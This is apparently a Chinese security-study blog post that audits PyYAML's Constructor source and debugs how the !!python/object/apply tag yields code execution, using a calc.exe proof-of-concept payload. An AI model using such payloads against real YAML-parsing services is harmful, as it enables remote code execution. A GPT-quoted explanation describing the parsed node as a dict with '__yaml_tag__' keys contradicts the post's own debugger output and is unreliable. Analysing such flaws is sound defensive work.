<span class="token keyword">print</span><span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里看文章他只使用load(data)就能行，但我这里必须添加Loader解析器参数</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token selector">'address': </span><span class="token punctuation">{</span><span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token string">'Anytown'</span><span class="token punctuation">,</span> <span class="token string">'state'</span><span class="token punctuation">:</span> <span class="token string">'CA'</span><span class="token punctuation">,</span> <span class="token string">'street'</span><span class="token punctuation">:</span> <span class="token string">'123 Main St'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">:</span> <span class="token string">'12345'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> 30<span class="token punctuation">,</span> <span class="token string">'hobbies'</span><span class="token punctuation">:</span> [<span class="token string">'reading'</span><span class="token punctuation">,</span> <span class="token string">'swimming'</span><span class="token punctuation">,</span> <span class="token string">'traveling'</span>]<span class="token punctuation">,</span> <span class="token string">'is_student'</span><span class="token punctuation">:</span> True<span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这段代码是将一个包含YAML格式字符串的变量<code>yaml_data</code><strong>反序列化</strong>为Python对象，并将其赋值给变量<code>data</code>。然后，它打印出<code>data</code>，输出反序列化后的Python对象。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader=yaml.Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>load(data, Loader=yaml.Loader)</code>是将YAML格式的字符串转换为Python对象的方法，其中<code>Loader</code>参数指定了YAML解析器的类型。</p>
<p>在默认情况下，<code>yaml.load</code>方法使用的解析器是<code>yaml.SafeLoader</code>，它可以安全地解析大多数YAML格式数据，但是不能解析包含Python对象的YAML数据。</p>
<p>&lt;=5.1 版本中提供了几个方法用于解析 YAML：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">yaml.load：加载单个 YAML 配置
yaml.load_all：加载多个 YAML 配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里说明一下PyYaml&lt;=5.1版本的Loader都有哪些加载器</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">Constructor</span><span class="token punctuation">:</span>5.1版本一下默认此加载器，在 YAML 规范上新增了很多强制类型转换
BaseConstructor：不支持强制类型转换
SafeConstructor：支持强制类型转换和 YAML 规范保持一致<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这里以默认的Constructor加载器为例，示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

<span class="token comment"># 自定义构造器函数</span>
<span class="token keyword">def</span> <span class="token function">construct_person</span><span class="token punctuation">(</span>loader<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 获取Person类的属性值</span>
    data <span class="token operator">=</span> loader<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token comment"># 实例化Person类并设置属性</span>
    <span class="token keyword">return</span> Person<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># 将!python/object标签映射到自定义构造器函数</span>
yaml<span class="token punctuation">.</span>add_constructor<span class="token punctuation">(</span><span class="token string">'!python/object:__main__.Person'</span><span class="token punctuation">,</span> construct_person<span class="token punctuation">)</span>

<span class="token comment"># 定义一个包含自定义类实例的YAML数据</span>
yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
name: John
age: 30
person:
  !python/object:__main__.Person
  name: Alice
  age: 25
"""</span>

<span class="token comment"># 使用yaml.Loader()方法解析YAML数据</span>
data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>yaml_data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span>

<span class="token comment"># 输出解析后的Python对象</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> 30<span class="token punctuation">,</span> <span class="token string">'person'</span><span class="token punctuation">:</span> &lt;__main__.Person object at 0x000001BA17055390&gt;<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里对于代码有许多不懂得地方，结合GPT理解一番</p>
<p>首先看这行代码<code>yaml.add_constructor('!python/object:__main__.Person', construct_person)</code></p>
<p>这里就是将<code>!python/object:__main__.Person</code>标签映射到construct_person函数，也就是说，当我们在解析yaml数据的时候，如果遇到了<code>!python/object:__main__.Person</code>标签，那就会自动的去调用construct_person函数。</p>
<p>而construct_person函数有两个参数，其中的node参数实际代表着节点，也就是<code>!python/object:__main__.Person</code>标签所对应的节点person，在调用construct_person函数的时候，会将person节点赋值给node，接着通过loader.construct_mapping函数，获取person节点中的属性值，转换为字典的形式，赋值给data参数，最后return的时候，实例化Person类，将对应的键值传入</p>
<p><strong>load_all(data)</strong>——该函数上面也提到过，这里举个例子来理解</p>
<p><code>load_all(data)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串。<code>load_all</code>函数是<code>PyYAML</code>模块中的一个方法，用于从一个包含多个YAML文档的字符串中解析出所有的YAML文档，并返回一个生成器对象，每个元素都是一个Python对象，对应一个YAML文档。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

<span class="token comment"># 定义包含两个YAML文档的字符串</span>
yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- name: John
  age: 30

- name: Alice
  age: 25
"""</span>

<span class="token comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load_all<span class="token punctuation">(</span>yaml_data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span><span class="token comment">#这里我仍然需要指定解析器参数</span>

<span class="token comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="token keyword">for</span> doc <span class="token keyword">in</span> docs<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>doc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205101617.png" alt="image-20240323205101617"></p>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">load_<span class="token function">all</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader=yaml.Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>load_all(data, Loader=yaml.Loader)</code>是一个函数调用表达式，其中<code>data</code>是一个包含多个YAML文档的字符串，<code>yaml.Loader</code>是<code>PyYAML</code>模块中的一个解析器，用于解析YAML文档。</p>
<p>这里以默认的加载器Constructor为例，示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

<span class="token comment"># 定义包含两个YAML文档的字符串</span>
yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- name: John
  age: 30

- name: Alice
  age: 25
"""</span>

<span class="token comment"># 使用yaml.load_all()方法解析所有的YAML文档</span>
docs <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load_all<span class="token punctuation">(</span>yaml_data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span>

<span class="token comment"># 遍历生成器对象并输出解析后的Python对象</span>
<span class="token keyword">for</span> doc <span class="token keyword">in</span> docs<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>doc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token selector">[</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'John'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> 30<span class="token punctuation">}</span><span class="token selector">, </span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> 25<span class="token punctuation">}</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这段代码使用<code>PyYAML</code>模块中的<code>yaml.load_all()</code>方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。</p>
<p>以上是PyYaml&lt;=5.1版本中常见的一些方法实现python和Yaml语言格式的转换的方法，但是往往在这种语言格式的转换的同时，也会存在一定的漏洞点的。</p>
<h2 id="漏洞成因–RCE">漏洞成因–RCE</h2>
<p>主要在PyYaml&lt;=5.1的版本下，默认<strong>Constructor</strong>为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。</p>
<p><a target="_blank" rel="noopener" href="http://xn--Constructor-km8qoeb784a8wr1o0exxutv1s.py">下面我们分析一下Constructor.py</a>，找一找在解析Python标签时的源码。</p>
<h3 id="python-object标签">!!python/object标签</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323173508853.png" alt="image-20240323173508853"></p>
<p>这里跟进yaml包之后如上图的函数，继续跟进，可以找到处理!!python/object标签的函数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">construct_python_object</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Format:</span>
    <span class="token comment">#   !!python/object:module.name { ... state ... }</span>
    instance <span class="token operator">=</span> self<span class="token punctuation">.</span>make_python_instance<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span> newobj<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">yield</span> instance
    deep <span class="token operator">=</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>instance<span class="token punctuation">,</span> <span class="token string">'__setstate__'</span><span class="token punctuation">)</span>
    state <span class="token operator">=</span> self<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span>deep<span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>set_python_instance_state<span class="token punctuation">(</span>instance<span class="token punctuation">,</span> state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="python-object-apply标签">!!python/object/apply标签</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174218701.png" alt="image-20240323174218701"></p>
<h3 id="python-object-new标签">!!python/object/new标签</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174321497.png" alt="image-20240323174321497"></p>
<h3 id="python-module标签">!!python/module标签</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174544420.png" alt="image-20240323174544420"></p>
<h3 id="python-name标签">!!python/name标签</h3>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323174607818.png" alt="image-20240323174607818"></p>
<p>看上面前两个标签会发现都调用了make_python_instance()这个函数方法，所以我们接着往下看make_python_instance()</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">make_python_instance</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> suffix<span class="token punctuation">,</span> node<span class="token punctuation">,</span>
            args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> kwds<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> newobj<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> unsafe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#用于创建Python对象的实例</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> args<span class="token punctuation">:</span>
            args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment">#对args进行空值处理，如果不存在，将args设置为空列表</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> kwds<span class="token punctuation">:</span>
            kwds <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">#对kwds进行空值处理，如果不存在，将kwds设置为空字典</span>
        cls <span class="token operator">=</span> self<span class="token punctuation">.</span>find_python_name<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> node<span class="token punctuation">.</span>start_mark<span class="token punctuation">)</span><span class="token comment">#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>unsafe <span class="token keyword">or</span> i<span class="token operator">/</span>sinstance<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python instance"</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>start_mark<span class="token punctuation">,</span>
                    <span class="token string">"expected a class, but found %r"</span> <span class="token operator">%</span> <span class="token builtin">type</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">,</span>
                    node<span class="token punctuation">.</span>start_mark<span class="token punctuation">)</span><span class="token comment">#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。</span>
        <span class="token keyword">if</span> newobj <span class="token keyword">and</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> cls<span class="token punctuation">.</span>__new__<span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> cls<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwds<span class="token punctuation">)</span>
        <span class="token comment">#根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>审计了一下make_python_instance()函数，可以发现，这里是通过args和kwds参数动态的创建Python对象的实例，所以，我们是可以利用这个特点进行执行我们的恶意代码，从而实现攻击。</p>
<p>我们可以发现在make_python_instance()中又调用了find_python_name()函数，接下来继续审计find_python_name()</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_python_name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> mark<span class="token punctuation">,</span> unsafe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"expected non-empty name appended to the tag"</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span> <span class="token comment">#如果name为空，将会报错</span>
        <span class="token keyword">if</span> <span class="token string">'.'</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
            module_name<span class="token punctuation">,</span> object_name <span class="token operator">=</span> name<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#如果name中包含"."，将会对name进行分割为模板名和对象名</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            module_name <span class="token operator">=</span> <span class="token string">'builtins'</span>
            object_name <span class="token operator">=</span> name <span class="token comment">#如果name中没有"."，则会将模板名命名为"builtins"，对象名命名为"name"</span>
        <span class="token keyword">if</span> unsafe<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token builtin">__import__</span><span class="token punctuation">(</span>module_name<span class="token punctuation">)</span> <span class="token comment">#unsafe默认为False，所以可以利用__import__将模块导入</span>
            <span class="token keyword">except</span> ImportError <span class="token keyword">as</span> exc<span class="token punctuation">:</span>
                <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                        <span class="token string">"cannot find module %r (%s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module_name<span class="token punctuation">,</span> exc<span class="token punctuation">)</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span> <span class="token comment">#如果ImportError异常，将会报错</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> module_name <span class="token keyword">in</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"module %r is not imported"</span> <span class="token operator">%</span> module_name<span class="token punctuation">,</span> mark<span class="token punctuation">)</span><span class="token comment">#如果模块不在sys.modules字典中，将会报错</span>
        module <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module_name<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> object_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"cannot find %r in the module %r"</span>
                    <span class="token operator">%</span> <span class="token punctuation">(</span>object_name<span class="token punctuation">,</span> module<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span><span class="token comment">#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> object_name<span class="token punctuation">)</span><span class="token comment">#利用getattr()函数获取返回值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>通过审计find_python_name()，我们发现还可以通过引用module的类创建对象，从而执行我们的恶意代码，实现攻击。</p>
<p>在上述代码看完之后，我还是有很多不懂的点，因此就想着直接看最终payload去调试分析。</p>
<p>这里明确的是!!python/object标签并不能实现RCE，具体的下面分析，但我们先分析剩下的可以实现RCE的原因</p>
<p>先看!!python/object/apply标签和!!python/object/new标签（因为这两个标签的处理方法一样，就是newobj值不一样，我们看看最终是否会影响结果）</p>
<h4 id="调试分析1">调试分析1</h4>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323181930329.png" alt="image-20240323181930329"></p>
<p>首先我们打一个端点，进入调试。步入之后，我们跟进get_single_data方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182001245.png" alt="image-20240323182001245"></p>
<p>继续跟进之后，我们来到下图位置，你也可以稍作尝试，会发现我们如果跟进construct_document方法的话，才是有趣的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182111649.png" alt="image-20240323182111649"></p>
<p>接下来就是无脑跟进，我们的重点就是观察其中参数值的变化，尤其是关注os.system与calc.exe分别在哪写参数上</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182238889.png" alt="image-20240323182238889"></p>
<p>如上图，我们会看到已经跟进到处理这两个标签的关键函数了，我们可以看一下各参数值</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323182352277.png" alt="image-20240323182352277"></p>
<p>如上图，这里的suffix为我们的os.system，也就是我们想要动态实例化的Python对象，我们现在可以回顾一下我们之前写的payload</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

payload <span class="token operator">=</span> <span class="token string">'!!python/object/apply:os.system ["calc.exe"]'</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们是搞了个键值对!!python/object/apply标签对应，这里我是觉得分析得不如GPT，因此我直接给GPT的回答了</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">重点分析给定的 `payload` 字符串 `<span class="token string">'!!python/object/apply:os.system ["calc.exe"]'</span>` 的组成和语法结构，进行详细解释如下：

1. `<span class="token string">'!!python/object/apply:os.system'</span>`：
   <span class="token operator">-</span> `!!` 是 YAML 的标签前缀，用于指定要应用的标签类型。
   <span class="token operator">-</span> `python/object/<span class="token property">apply</span><span class="token punctuation">:</span>os.system` 是标签值，指定了要使用的构造器函数和模块路径。在这里，`apply` 标签表示要应用一个函数，`os.system` 是函数的路径，表示要调用 `os` 模块中的 `system` 函数。

2. `[<span class="token string">"calc.exe"</span>]`：
   <span class="token operator">-</span> 这是一个包含单个元素 `<span class="token string">"calc.exe"</span>` 的列表。
   <span class="token operator">-</span> 这个列表是作为参数传递给构造器函数 `os.system` 的参数列表。

综合起来，给定的 `payload` 表达了一个 YAML 数据结构，它使用特定的标签和参数列表来构造一个对象。具体地说，它使用 `apply` 标签来调用 `os.system` 函数，将 `<span class="token string">"calc.exe"</span>` 作为参数传递给该函数。

需要注意的是，由于这个 `payload` 包含了敏感操作 `os.<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span>`，在实际使用中应谨慎处理，以避免安全风险。在加载和解析此类 YAML 数据时，应确保可信任的数据源和适当的安全措施。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说白了，就是靠python/object/apply指定了构造器函数（也就是我们默认的constructor），然后想要去调用os.system函数，并传入calc这个参数。这样的话，我们再继续看上述跟进到的位置</p>
<p>suffix很明显了，就是被赋值为了os.system函数，没啥说的，接下来可以看一下node节点参数的内容</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">node=<span class="token function">SequenceNode</span><span class="token punctuation">(</span>tag=<span class="token string">'tag:yaml.org,2002:python/object/apply:os.system'</span><span class="token punctuation">,</span> value=[<span class="token function">ScalarNode</span><span class="token punctuation">(</span>tag=<span class="token string">'tag:yaml.org,2002:str'</span><span class="token punctuation">,</span> value=<span class="token string">'calc.exe'</span><span class="token punctuation">)</span>]<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>对于为何 node 参数是这样的内容，GPT是这样回答的</p>
<p>对于给定的 YAML 数据 <code>!!python/object/new:os.system ["calc.exe"]</code>，如果将其进行反序列化（即使用适当的 YAML 解析器进行加载），则其中的 <code>node</code> 节点将是一个包含以下内容的字典：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span>
    <span class="token string">'__yaml_tag__'</span><span class="token punctuation">:</span> <span class="token string">'tag:yaml.org,2002:python/object/apply:os.system'</span><span class="token punctuation">,</span>
    <span class="token string">'__args__'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'calc.exe'</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里，<code>node</code> 是一个字典，其中包含两个键值对：</p>
<ul>
<li><code>'__yaml_tag__'</code> 键表示 YAML 标签，指示要实例化的对象类型。在这种情况下，标签为 <code>'tag:yaml.org,2002:python/object/new:os.system'</code>，表示要使用 <code>os.system</code> 类进行实例化。</li>
<li><code>'__args__'</code> 键表示传递给构造函数的参数列表。在此示例中，<code>['calc.exe']</code> 是作为参数传递给 <code>os.system</code> 构造函数的参数列表。</li>
</ul>
<p>通过加载该 YAML 数据并解析 <code>node</code> 节点，可以使用相应的构造器函数和参数来实例化 <code>os.system</code> 类对象。请注意，由于该 YAML 数据包含敏感操作 <code>os.system("calc.exe")</code>，在实际使用中应谨慎处理，以避免安全风险。</p>
<p>好，我们知道了上述参数的具体构成，接下来继续跟进，如果我们尝试过，就知道这里需要跟进一下construct_sequence来看看具体的函数逻辑</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183135875.png" alt="image-20240323183135875"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183218060.png" alt="image-20240323183218060"></p>
<p>如上图，跟进之后看到这个函数，首先判断node的类型是否是SequenceNode，如果不是，则报错；否则，通过for语句提取出node中的value值然后返回，而我们知道其中的value值有一个calc.exe，这很有趣，继续跟进。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183801409.png" alt="image-20240323183801409"></p>
<p>这里发现最终child的value值成了calc.exe</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323183952814.png" alt="image-20240323183952814"></p>
<p>如上图，该函数在处理node的时候判断其是否是MappingNode实例，但根据值我们知道肯定不是，于是直接跳到return语句</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184103109.png" alt="image-20240323184103109"></p>
<p>上述return语句继续跟进函数的话，会到达上图，因为node是ScalarNode实例，于是他就直接返回node的value=calc.exe，但这里我有点懵，我想知道先前node的第一个value去哪了？？？所以我们重新调试一下看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184448506.png" alt="image-20240323184448506"></p>
<p>我们重新调试跟进到上方，突然就知道什么鬼了，之前就没注意，这里经过for循环将value给了child，但他的value是</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">value=[<span class="token function">ScalarNode</span><span class="token punctuation">(</span>tag=<span class="token string">'tag:yaml.org,2002:str'</span><span class="token punctuation">,</span> value=<span class="token string">'calc.exe'</span><span class="token punctuation">)</span>]<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>当初我还以为是两个value，结果这里是value的嵌套。。。。继续跟进就顿悟了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184625946.png" alt="image-20240323184625946"></p>
